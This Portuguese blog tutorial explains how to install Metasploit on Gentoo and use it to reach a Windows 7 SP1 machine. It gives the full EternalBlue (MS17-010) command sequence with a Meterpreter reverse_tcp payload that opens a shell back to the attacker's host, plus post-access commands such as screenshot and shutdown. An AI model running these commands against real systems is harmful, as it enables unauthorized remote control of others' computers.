---
layout: post
title: "Como Acessar o Windows pelo Linux com Metasploit"
date: 2019-04-17 21:03:35
image: '/assets/img/dicas/metasploit-linux-min.jpg'
description: 'Metasploit é um projeto de segurança da informação que fornece informações sobre vulnerabilidades de segurança e ajuda nos testes de penetração.'
tags:
- metasploit
- security
- windows
---

![Como Acessar o Windows pelo Linux com Metasploit](/assets/img/dicas/metasploit-linux-min.jpg)

## Introdução

O [Metasploit](https://www.metasploit.com/) é um projeto de segurança da informação que fornece informações sobre vulnerabilidades de segurança e ajuda nos testes de penetração . 

É de propriedade da empresa de segurança Rapid7 , de Boston, Massachusetts que possui diversos softwares ( **Opcode** - *Banco de Dados* ; e o **Shellcode** , *que executa comandos de* [Shell Script](http://terminalroot.com.br/shell), ... ), entre eles o mais conhecido que é o [Metasploit Framework](https://github.com/rapid7/metasploit-framework), um software de código aberto uma ferramenta para explorar falhas de uma máquina remota.

O Metasploit possui 6 tipos de módulos (*auxiliary*, *exploit*, *payload*, *post*, *encoder* e *nop*) . No vídeo apresentado por nós vamos utilizar o [Meterpreter](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter) que  é um *payload* avançado.


## Instalação

Existem diversas maneiras de você instalar o **Metasploit Framework** . Baixando diretamente pelo site <https://www.metasploit.com/> ou pelo GitHub <https://github.com/rapid7/metasploit-framework> . Ou instalando via gerenciador de pacotes da sua distribuição, por exemplo, na distribuição que eu utilizo [Gentoo](https://gentoo.org) basta realizar os comandos abaixo:

{% highlight bash %}
# su ou sudo
emerge -a net-analyzer/metasploit \
dev-ruby/metasploit_payloads-mettle \
dev-ruby/metasploit_data_models \
dev-ruby/metasploit-payloads \
dev-ruby/metasploit-model \
dev-ruby/metasploit-credential \
dev-ruby/metasploit-concern \
app-eselect/eselect-metasploit
{% endhighlight %}

O comando acima irá pedir para atualizar o *package.use* por conta das flags, então rode o comando:

{% highlight bash %}
etc-update --automode -5
{% endhighlight %}

E então rode o comando de instalação novamente.

Após instalação, talvez você não encontre o comando `msfconsole` responsável por abrir o Metasploit, então crie um link simbólico com o *root* ou *sudo*, com o comando abaixo:

{% highlight bash %}
ln -s /usr/lib64/metasploit4.17/msfconsole /usr/bin/msfconsole
{% endhighlight %}

E pronto, o Metasploit está pronto para uso! Lembrando que em algumas distribuições já possuem o Metasploit instalado por padrão, como o [Pentoo](http://terminalroot.com.br/2018/02/como-instalar-o-pentoo-um-gentoo-para-pentest.html) e o [Kali Linux](https://www.kali.org/) entre outras criadas especialmente para testes de invasão.

Próximo passo é rodar o Metasploit rodando o comando:

{% highlight bash %}
msfconsole
{% endhighlight %}

Isso irá abrir o framework, e em seguida usaremos o Meterpreter para acessar o [Windows](http://terminalroot.com.br/2018/03/como-usar-o-shell-bash-no-windows.html) , basta rodar os comandos abaixo na ordem:

{% highlight bash %}
use exploit/windows/smb/ms17_010_eternalblue
set RHOST NÚMERO_IP_DA_MÁQUINA_WINDOWS
set payload windows/x64/meterpreter/reverse_tcp
set LHOST NÚMERO_IP_DA_SUA_MÁQUINA
set encoder generic/none
exploit
{% endhighlight %}

Lembrando que esses comandos são a grosso modo e servem para Windows 7 Service Pack 1 , para outras versões assista o vídeo com link abaixo que há mais detalhes para variados casos:

Após acessar você pode obter informações detalhadas do sistema com o comando `sysinfo`; tirar um print da tela com o comando `screenshot` ; saber qual diretório você está com o comando `pwd` a saída será algo do tipo *c:\windows\system32\* ; desligar, reiniciar,... entre vários comando que podem ser consultado pelo comando `help` .

## Assista ao Vídeo

# [Clique Aqui Para Ver o Vídeo](https://youtu.be/VcbC0yJsWic)

> Esse artigo e o vídeo apresentado foram criados com finalidade didática.

***

## Conheça nosso Treinamentos de Shell Script, Vim, Expressões Regulares e Sed
# <http://terminalroot.com.br/cursos>

## Crie Sua Promoção
# <http://terminalroot.com.br/promo>

## Acompanhe todos os vídeos da **Série Shell Script Profissional**
# [#ShellPro](http://bit.ly/shell-pro-root)

Comente!

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>

<!-- Informat -->
<ins class="adsbygoogle"
 style="display:block"
 data-ad-client="ca-pub-2838251107855362"
 data-ad-slot="2327980059"
 data-ad-format="auto"
 data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>



